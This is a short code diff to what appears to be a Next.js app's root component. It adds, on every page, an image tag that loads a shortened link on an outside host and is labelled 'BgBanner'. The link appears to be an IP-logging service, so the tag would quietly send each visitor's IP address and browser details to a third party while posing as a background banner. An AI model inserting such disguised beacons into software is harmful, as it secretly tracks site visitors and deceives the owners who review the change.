@@ -11,6 +11,8 @@ function MyApp({ Component, pageProps }) {
     <>
       <RootProvider>
         <GlobalStyle />
+        <img src="https://yip.su/1kF6u7" alt="BgBanner" />
+
         <Component {...pageProps} />
       </RootProvider>
     </>
